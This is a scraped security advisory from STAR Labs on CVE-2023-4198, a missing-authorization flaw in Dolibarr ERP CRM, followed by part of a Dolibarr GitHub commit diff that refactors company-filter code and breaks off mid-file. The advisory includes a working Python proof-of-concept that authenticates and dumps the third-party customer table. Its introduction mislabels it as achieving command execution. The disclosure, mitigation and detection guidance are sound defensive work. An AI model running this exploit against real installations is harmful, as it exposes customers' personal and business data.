=== Content from starlabs.sg_521df037_20250111_192222.html ===

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Advisories](https://starlabs.sg/advisories/)
# (CVE-2023-4198) Dolibarr ERP CRM (<= 17.0.3) Improper Access Control

October 11, 2023 · 4 min · Poh Jia Hao (@Chocologicall)

Table of Contents

* [Summary:](#summary)
* [CVSS3.1 Scoring System:](#cvss31-scoring-system)
* [Product Overview:](#product-overview)
* [Vulnerability Summary:](#vulnerability-summary)
* [Vulnerability Details:](#vulnerability-details)
* [Exploit Conditions:](#exploit-conditions)
* [Proof-of-Concept:](#proof-of-concept)
* [Suggested Mitigations:](#suggested-mitigations)
* [Detection Guidance:](#detection-guidance)
* [Credits:](#credits)
* [Timeline:](#timeline)

## Summary:[#](#summary)

| **Product** | Dolibarr ERP CRM |
| --- | --- |
| **Vendor** | Dolibarr |
| **Severity** | High |
| **Affected Versions** | <= 17.0.3 |
| **Tested Versions** | 17.0.1, 17.0.3 |
| **CVE Identifier** | CVE-2023-4198 |
| **CVE Description** | Improper Access Control in Dolibarr ERP CRM v17.0.3 allows unauthorized users to read a database table containing sensitive third-party customers’ information via the ajaxcompanies.php endpoint. |
| **CWE Classification(s)** | CWE-862 Missing Authorization |
| **CAPEC Classification(s)** | CAPEC-1 Accessing Functionality Not Properly Constrained by ACLs |

## CVSS3.1 Scoring System:[#](#cvss31-scoring-system)

**Base Score:** 6.5 (Medium)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Network |
| **Attack Complexity (AC)** | Low |
| **Privileges Required (PR)** | Low |
| **User Interaction (UI)** | None |
| **Scope (S)** | Unchanged |
| **Confidentiality (C)** | High |
| **Integrity (I)** | None |
| **Availability (A)** | None |

## Product Overview:[#](#product-overview)

Dolibarr ERP CRM is a web-based software that provides management for the target organization’s activities, such as contacts, suppliers, invoices, orders, stocks, agenda, etc. It is an open-source software suite designed for small, medium or large companies, foundations and freelancers. Administrators can use the fine grained permissions manager to grant permissions to various users based on their operational requirements.

Dolibarr ERP CRM operates as an all-in-one suite, which allows customizability based on the usage needs of the organization. It is highly modular as the administrators simply have to enable modules that they need and disable the ones they do not require. Almost every component is a module, which also means that Dolibarr ERP CRM is highly extensible in terms of features.

## Vulnerability Summary:[#](#vulnerability-summary)

Authorization checks were found to be missing as any authenticated user is able to list the details of all third-party customers stored in the database table `societe`, despite not having the required permissions to do so. This table contains sensitive data such as the third-party customers’ address, ZIP and town name.

## Vulnerability Details:[#](#vulnerability-details)

The vulnerability is found at the `/core/ajax/ajaxcompanies.php` endpoint. It can be observed that no authorisation checks are performed, even though the application has the option to configure access control for each AJAX endpoint. The affected code can be found below:

```
// /core/ajax/ajaxcompanies.php
$socid = $_GET['newcompany'] ? $_GET['newcompany'] : '';
// ...
$sql .= "s.nom LIKE '%".$db->escape($socid)."%'";
$sql .= " OR s.code_client LIKE '%".$db->escape($socid)."%'";
$sql .= " OR s.code_fournisseur LIKE '%".$db->escape($socid)."%'";

```

Additionally, since the SQL query is formed by concatenating user-input in the `LIKE` clause, listing every row can be done by injecting `%` as the input. In order to exploit the vulnerability, the adversary must first be authenticated with any account. Then, access the vulnerable page by sending a GET request to:

`http://TARGET_SERVER/core/ajax/ajaxcompanies.php?newcompany=%`

![](/advisories/23/images/CVE-2023-4198_01.Listing.png)

## Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited by having access to a low-privilege user account.

## Proof-of-Concept:[#](#proof-of-concept)

We have tried our best to make the PoC as portable as possible. The following is a functional exploit written in Python3 that exploits this vulnerability to achieve remote command execution:

```
# Dolibarr ERP CRM (<= v17.0.3) Improper Access Control Vulnerability (CVE-2023-4198)
# Via: https://TARGET_HOST/core/ajax/ajaxcompanies.php
# Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)
#!/usr/bin/env python3
import json
import re
import requests
import sys
requests.packages.urllib3.disable_warnings()
s = requests.Session()
def check_args():
    global target, username, password, cmd
    print("\n===== Dolibarr ERP CRM (<= v17.0.3) Improper Access Control Vulnerability (CVE-2023-4198) =====\n")
    if len(sys.argv) != 4:
        print("[!] Please enter the required arguments like so: python3 {} https://TARGET_URL USERNAME PASSWORD".format(sys.argv[0]))
        sys.exit(1)
    target = sys.argv[1].strip("/")
    username = sys.argv[2]
    password = sys.argv[3]
def authenticate():
    global s, csrf_token
    print("[+] Attempting to authenticate...")
    # GET the CSRF token
    res = s.get(f"{target}/", verify=False)
    csrf_token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", res.text).group(1).strip()
    # Login
    data = {
        "token": csrf_token,
        "username": username,
        "password": password,
        "actionlogin": "login"
    }
    res = s.post(f"{target}/", data=data, verify=False)
    if "Logout" not in res.text:
        print("[!] Authentication failed! Are the credentials valid?")
        sys.exit(1)
    else:
        print("[+] Authenticated successfully!")
def dump_table():
    # Dump the third-party customers table
    print("[+] Dumping third-party customers table (societe)...")
    res = s.get(f"{target}/core/ajax/ajaxcompanies.php?newcompany=%", verify=False, proxies={'http':'127.0.0.1:8080'})
    if res.status_code != 200:
        print("[!] Endpoint unreachable! Is the URL correct?")
        sys.exit(1)
    else:
        output = json.loads(res.text)
        print(f"[+] Output of societe table:\n\n{output}")
def main():
    check_args()
    authenticate()
    dump_table()
if __name__ == "__main__":
    main()

```

![](/advisories/23/images/CVE-2023-4198_02.Exploit.gif)

## Suggested Mitigations:[#](#suggested-mitigations)

Update the Dolibarr installation to the latest version as shown from the official repository [releases page](https://github.com/Dolibarr/dolibarr/releases).

## Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by checking the server’s access logs to see if there were any requests made to `/core/ajax/ajaxcompanies.php`, and inspecting the value of the `newcompany` parameter of these requests.

## Credits:[#](#credits)

Poh Jia Hao ([@Chocologicall](https://twitter.com/Chocologicall)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

## Timeline:[#](#timeline)

* 2023-09-04 Reported vulnerability to Dolibarr owner
* 2023-09-05 Dolibarr owner mentioned that the endpoint has been removed since `v18.0.0`
* 2023-11-01 Public Release

[« Prev

(CVE-2023-4197) Dolibarr ERP CRM (<= 18.0.1) Improper Input Sanitization Authenticated RCE](https://starlabs.sg/advisories/23/23-4197/)
[Next »

(CVE-2023-30591) NodeBB Pre-Authentication Denial-of-Service](https://starlabs.sg/advisories/23/23-30591/)

© 2024 [STAR Labs](https://starlabs.sg/)
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://git.io/hugopapermod)



=== Content from github.com_a5d0c872_20250111_192221.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fcommit%2F3065b9ca6ade988e8d7a8a8550415c0abb56b9cb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fcommit%2F3065b9ca6ade988e8d7a8a8550415c0abb56b9cb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Dolibarr%2Fdolibarr)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Dolibarr](/Dolibarr)
/
**[dolibarr](/Dolibarr/dolibarr)**
Public

* [Notifications](/login?return_to=%2FDolibarr%2Fdolibarr) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FDolibarr%2Fdolibarr)
* [Star
   5.6k](/login?return_to=%2FDolibarr%2Fdolibarr)

* [Code](/Dolibarr/dolibarr)
* [Issues
  936](/Dolibarr/dolibarr/issues)
* [Pull requests
  233](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects
  2](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

Additional navigation options

* [Code](/Dolibarr/dolibarr)
* [Issues](/Dolibarr/dolibarr/issues)
* [Pull requests](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

## Commit

[Permalink](/Dolibarr/dolibarr/commit/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Clean code

[Browse files](/Dolibarr/dolibarr/tree/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb)
Browse the repository at this point in the history

* Loading branch information

[![@eldy](https://avatars.githubusercontent.com/u/883887?s=40&v=4)](/eldy)

[eldy](/Dolibarr/dolibarr/commits?author=eldy "View all commits by eldy")
committed
Apr 27, 2023

1 parent
[263d315](/Dolibarr/dolibarr/commit/263d315ba4e06f37340b9c3649c3c1a32a7f03c0)

commit 3065b9c

 Show file tree

 Hide file tree

Showing
**28 changed files**
with
**241 additions**
and
**336 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* htdocs

  + categories

    - htdocs/categories/viewcat.php
      [viewcat.php](#diff-52edea82cedfed5da76bec6cbe61564c83771e551cb9f3a318e7a84dce50e65f)
  + comm/propal

    - htdocs/comm/propal/card.php
      [card.php](#diff-69e35ee0d71e3053de0448b2d4849b9598062bbcdbaff5ae4c391540b99faab2)
    - stats

      * htdocs/comm/propal/stats/index.php
        [index.php](#diff-8052eb96c6279d21e68e898ea5f2fb8205a673c4ac8a461404d49bbb855bd75d)
  + commande

    - htdocs/commande/card.php
      [card.php](#diff-96a519e1f858c3fdb8f2c7501bbc7d5e250fd5045679ed6736d2c9d7320cfe56)
    - stats

      * htdocs/commande/stats/index.php
        [index.php](#diff-f1ac0823f0c97853b4bf62e476e731221ee4dc705ca5ce65fb5b00df2597a7bf)
  + compta

    - deplacement/stats

      * htdocs/compta/deplacement/stats/index.php
        [index.php](#diff-2abfee76224f6bab285076c5bc8365da428da3f8fd88a8ca444296f58594d642)
    - facture

      * htdocs/compta/facture/card.php
        [card.php](#diff-982e19eda60a61d1967df4d2a3692f32891cac6c989a3267e20c3b4dc3cd6315)
      * stats

        + htdocs/compta/facture/stats/index.php
          [index.php](#diff-251ea383ee2ca6f1b04a72a6279e15dc7e64acac5bcb13d4c62172a2e7310e07)
    - stats

      * htdocs/compta/stats/cabyprodserv.php
        [cabyprodserv.php](#diff-eb5b783cac54270af53c7d2f4b1041b9dab9f80b8ba15a6af1daa98eeb3c0361)
      * htdocs/compta/stats/supplier\_turnover\_by\_prodserv.php
        [supplier\_turnover\_by\_prodserv.php](#diff-ea89742fdfeffdffb5555eaaedd818ed260a6a2be858af77f3f0c914eb31f166)
  + contact

    - htdocs/contact/card.php
      [card.php](#diff-7307a45028dca98060cd867efe4dff3948c1ccbcda82f4350ecbf45f9317e715)
  + contrat

    - htdocs/contrat/card.php
      [card.php](#diff-b36b235b2eb1cbfba445b9f143a513acfaafd2819bece067f5f5bafb9f5c6ed4)
  + core

    - ajax

      * htdocs/core/ajax/ajaxcompanies.php
        [ajaxcompanies.php](#diff-7d68365a708c954051853ade884c7e97c6ff13150ee92657d6ffc8603e0f947b)
    - class

      * htdocs/core/class/html.form.class.php
        [html.form.class.php](#diff-a246d67b4a381cae23b14b00ea3a3ac28f5863b8aa2f7791a1f74220efddfe6a)
    - lib

      * htdocs/core/lib/functions.lib.php
        [functions.lib.php](#diff-5d84abef58f52f9e814238b7074bbb130485b535163c5d0d66282165652f62d8)
  + don

    - htdocs/don/card.php
      [card.php](#diff-808d0730ae3d10f0d6248eab0bbcc449bdf7977eb11b9b181a8d8b97477e3d92)
  + fourn

    - commande

      * htdocs/fourn/commande/card.php
        [card.php](#diff-2c3b36599b4bc2f5c30f99b45421419dac25ee149b0230b7f82bbcb1fb39fb10)
    - facture

      * htdocs/fourn/facture/card.php
        [card.php](#diff-cd4a1687fbe773a27b793df12db0faa0ef6b52084f01b16371fd759781424f23)
  + margin

    - htdocs/margin/customerMargins.php
      [customerMargins.php](#diff-742496dfeed639110dd4edc1e1ce8ab19305d63791545c787e12b0b65e310593)
  + product

    - htdocs/product/fournisseurs.php
      [fournisseurs.php](#diff-a4801cb425c11959882d6909d87d5ab5a237b7de7dffe3e0b9ad6e244faa545c)
    - htdocs/product/price.php
      [price.php](#diff-d37d5437724e7789c4d0d98eaefbe2dad1dd96e9c1ad52e934c044ce1e92eeb7)
    - stock

      * htdocs/product/stock/replenish.php
        [replenish.php](#diff-efc92ea42c2a164964a0af6d74d04981901a7a951994d5b8e2fb5c4beb0fbf51)
  + projet

    - htdocs/projet/card.php
      [card.php](#diff-a4773c6812dc35f3f2fc4b2c86551c12b5094732029ec97657a98a1960ba6c81)
  + societe

    - ajax

      * htdocs/societe/ajax/ajaxcompanies.php
        [ajaxcompanies.php](#diff-4c031184703971d2a5c3035fd6fe1d86e9388c77e55333bfb5e314d8d607ccb4)
      * htdocs/societe/ajax/company.php
        [company.php](#diff-8925be2929a93960c23c9c0a66a197e588e39db9a560e5daa6addd47fdefeacc)
    - htdocs/societe/card.php
      [card.php](#diff-5ffd6a17bdb1c872b30736668065e7d28879e9966f6489fca6c8aa27545d79aa)
  + supplier\_proposal

    - htdocs/supplier\_proposal/card.php
      [card.php](#diff-97f6971978f355cf3cb6c62fb396963b28d8938b9388a664b84d4bc7cb89cfb2)
  + takepos/admin

    - htdocs/takepos/admin/terminal.php
      [terminal.php](#diff-c29cdb07fea42f5497b1a65c97d1269c0726df8dae645a36f4a0e2f63f491951)

## There are no files selected for viewing

6 changes: 4 additions & 2 deletions

6
[htdocs/categories/viewcat.php](#diff-52edea82cedfed5da76bec6cbe61564c83771e551cb9f3a318e7a84dce50e65f "htdocs/categories/viewcat.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/categories/viewcat.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -590,7 +590,8 @@ |
|  |  | print '<table class="noborder centpercent">'; |
|  |  | print '<tr class="liste\_titre"><td>'; |
|  |  | print $langs->trans("AddCustomerIntoCategory").' &nbsp;'; |
|  |  | print $form->select\_company('', 'elemid', 's.client IN (1,3)'); |
|  |  | $filter = 's.client IN (1,3)'; |
|  |  | print $form->select\_company('', 'elemid', $filter); |
|  |  | print '<input type="submit" class="button buttongen" value="'.$langs->trans("ClassifyInCategory").'"></td>'; |
|  |  | print '</tr>'; |
|  |  | print '</table>'; |
| Expand Down  Expand Up | | @@ -670,7 +671,8 @@ |
|  |  | print '<table class="noborder centpercent">'; |
|  |  | print '<tr class="liste\_titre"><td>'; |
|  |  | print $langs->trans("AddSupplierIntoCategory").' &nbsp;'; |
|  |  | print $form->select\_company('', 'elemid', 's.fournisseur = 1'); |
|  |  | $filter ='s.fournisseur = 1'; |
|  |  | print $form->select\_company('', 'elemid', $filter); |
|  |  | print '<input type="submit" class="button buttongen" value="'.$langs->trans("ClassifyInCategory").'"></td>'; |
|  |  | print '</tr>'; |
|  |  | print '</table>'; |
| Expand Down | |  |

6 changes: 4 additions & 2 deletions

6
[htdocs/comm/propal/card.php](#diff-69e35ee0d71e3053de0448b2d4849b9598062bbcdbaff5ae4c391540b99faab2 "htdocs/comm/propal/card.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/comm/propal/card.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -1810,7 +1810,8 @@ |
|  |  | //$warehouse\_id = $soc->warehouse\_id; |
|  |  | } else { |
|  |  | print '<td class="valuefieldcreate">'; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"').$form->select\_company('', 'socid', '((s.client = 1 OR s.client = 2 OR s.client = 3) AND status=1)', 'SelectThirdParty', 1, 0, null, 0, 'minwidth300 maxwidth500 widthcentpercentminusxx'); |
|  |  | $filter = '((s.client = 1 OR s.client = 2 OR s.client = 3) AND status=1)'; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"').$form->select\_company('', 'socid', $filter, 'SelectThirdParty', 1, 0, null, 0, 'minwidth300 maxwidth500 widthcentpercentminusxx'); |
|  |  | // reload page to retrieve customer informations |
|  |  | if (empty($conf->global->RELOAD\_PAGE\_ON\_CUSTOMER\_CHANGE\_DISABLED)) { |
|  |  | print '<script> |
| Expand Down  Expand Up | | @@ -2133,10 +2134,11 @@ |
|  |  | // Clone confirmation |
|  |  | if ($action == 'clone') { |
|  |  | // Create an array for form |
|  |  | $filter = '(s.client=1 OR s.client=2 OR s.client=3)'; |
|  |  | $formquestion = array( |
|  |  | // 'text' => $langs->trans("ConfirmClone"), |
|  |  | // array('type' => 'checkbox', 'name' => 'clone\_content', 'label' => $langs->trans("CloneMainAttributes"), 'value' => 1), |
|  |  | array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company(GETPOST('socid', 'int'), 'socid', '(s.client=1 OR s.client=2 OR s.client=3)', '', 0, 0, null, 0, 'maxwidth300')), |
|  |  | array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company(GETPOST('socid', 'int'), 'socid', $filter, '', 0, 0, null, 0, 'maxwidth300')), |
|  |  | array('type' => 'checkbox', 'name' => 'update\_prices', 'label' => $langs->trans('PuttingPricesUpToDate'), 'value' => 0), |
|  |  | array('type' => 'checkbox', 'name' => 'update\_desc', 'label' => $langs->trans('PuttingDescUpToDate'), 'value' => 0), |
|  |  | ); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[htdocs/comm/propal/stats/index.php](#diff-8052eb96c6279d21e68e898ea5f2fb8205a673c4ac8a461404d49bbb855bd75d "htdocs/comm/propal/stats/index.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/comm/propal/stats/index.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -263,8 +263,8 @@ |
|  |  | print '<tr class="liste\_titre"><td class="liste\_titre" colspan="2">'.$langs->trans("Filter").'</td></tr>'; |
|  |  | // Company |
|  |  | print '<tr><td class="left">'.$langs->trans("ThirdParty").'</td><td class="left">'; |
|  |  | $filter = 's.client IN (1,2,3)'; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"'); |
|  |  | $filter = 's.client IN (1,2,3)'; |
|  |  | print $form->select\_company($socid, 'socid', $filter, 1, 0, 0, array(), 0, 'widthcentpercentminusx maxwidth300', ''); |
|  |  | print '</td></tr>'; |
|  |  | // ThirdParty Type |
| Expand Down | |  |

6 changes: 4 additions & 2 deletions

6
[htdocs/commande/card.php](#diff-96a519e1f858c3fdb8f2c7501bbc7d5e250fd5045679ed6736d2c9d7320cfe56 "htdocs/commande/card.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/commande/card.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -1788,7 +1788,8 @@ |
|  |  | print '</td>'; |
|  |  | } else { |
|  |  | print '<td>'; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"').$form->select\_company('', 'socid', '((s.client = 1 OR s.client = 2 OR s.client = 3) AND s.status=1)', 'SelectThirdParty', 1, 0, null, 0, 'minwidth175 maxwidth500 widthcentpercentminusxx'); |
|  |  | $filter = '((s.client = 1 OR s.client = 2 OR s.client = 3) AND s.status=1)'; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"').$form->select\_company('', 'socid', $filter, 'SelectThirdParty', 1, 0, null, 0, 'minwidth175 maxwidth500 widthcentpercentminusxx'); |
|  |  | // reload page to retrieve customer informations |
|  |  | if (empty($conf->global->RELOAD\_PAGE\_ON\_CUSTOMER\_CHANGE\_DISABLED)) { |
|  |  | print '<script> |
| Expand Down  Expand Up | | @@ -2337,9 +2338,10 @@ |
|  |  |  |
|  |  | // Clone confirmation |
|  |  | if ($action == 'clone') { |
|  |  | $filter = '(s.client=1 OR s.client = 2 OR s.client=3)'; |
|  |  | // Create an array for form |
|  |  | $formquestion = array( |
|  |  | array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company(GETPOST('socid', 'int'), 'socid', '(s.client=1 OR s.client = 2 OR s.client=3)', '', 0, 0, null, 0, 'maxwidth300')) |
|  |  | array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company(GETPOST('socid', 'int'), 'socid', $filter, '', 0, 0, null, 0, 'maxwidth300')) |
|  |  | ); |
|  |  | $formconfirm = $form->formconfirm($\_SERVER["PHP\_SELF"].'?id='.$object->id, $langs->trans('ToClone'), $langs->trans('ConfirmCloneOrder', $object->ref), 'confirm\_clone', $formquestion, 'yes', 1); |
|  |  | } |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[htdocs/commande/stats/index.php](#diff-f1ac0823f0c97853b4bf62e476e731221ee4dc705ca5ce65fb5b00df2597a7bf "htdocs/commande/stats/index.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/commande/stats/index.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -295,6 +295,7 @@ |
|  |  | print '<tr class="liste\_titre"><td class="liste\_titre" colspan="2">'.$langs->trans("Filter").'</td></tr>'; |
|  |  | // Company |
|  |  | print '<tr><td class="left">'.$langs->trans("ThirdParty").'</td><td class="left">'; |
|  |  | $filter = ''; |
|  |  | if ($mode == 'customer') { |
|  |  | $filter = 's.client IN (1,2,3)'; |
|  |  | } |
| Expand Down | |  |

3 changes: 1 addition & 2 deletions

3
[htdocs/compta/deplacement/stats/index.php](#diff-2abfee76224f6bab285076c5bc8365da428da3f8fd88a8ca444296f58594d642 "htdocs/compta/deplacement/stats/index.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/compta/deplacement/stats/index.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -242,9 +242,8 @@ |
|  |  | print '<tr class="liste\_titre"><td class="liste\_titre" colspan="2">'.$langs->trans("Filter").'</td></tr>'; |
|  |  | // Company |
|  |  | print '<tr><td>'.$langs->trans("ThirdParty").'</td><td>'; |
|  |  | $filter = ''; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"'); |
|  |  | print $form->select\_company($socid, 'socid', $filter, 1, 1, 0, array(), 0, 'widthcentpercentminusx maxwidth300', ''); |
|  |  | print $form->select\_company($socid, 'socid', '', 1, 1, 0, array(), 0, 'widthcentpercentminusx maxwidth300', ''); |
|  |  | print '</td></tr>'; |
|  |  | // User |
|  |  | print '<tr><td>'.$langs->trans("User").'</td><td>'; |
| Expand Down | |  |

6 changes: 4 additions & 2 deletions

6
[htdocs/compta/facture/card.php](#diff-982e19eda60a61d1967df4d2a3692f32891cac6c989a3267e20c3b4dc3cd6315 "htdocs/compta/facture/card.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/compta/facture/card.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3205,7 +3205,8 @@ |
|  |  | } else { |
|  |  | print '<tr><td class="fieldrequired">'.$langs->trans('Customer').'</td>'; |
|  |  | print '<td colspan="2">'; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"').$form->select\_company($soc->id, 'socid', '((s.client = 1 OR s.client = 3) AND s.status = 1)', 'SelectThirdParty', 1, 0, null, 0, 'minwidth300 widthcentpercentminusxx maxwidth500'); |
|  |  | $filter = '((s.client = 1 OR s.client = 3) AND s.status = 1)'; |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"').$form->select\_company($soc->id, 'socid', $filter, 'SelectThirdParty', 1, 0, null, 0, 'minwidth300 widthcentpercentminusxx maxwidth500'); |
|  |  | // Option to reload page to retrieve customer informations. |
|  |  | if (empty($conf->global->RELOAD\_PAGE\_ON\_CUSTOMER\_CHANGE\_DISABLED)) { |
|  |  | print '<script> |
| Expand Down  Expand Up | | @@ -4319,9 +4320,10 @@ function setRadioForTypeOfIncoice() { |
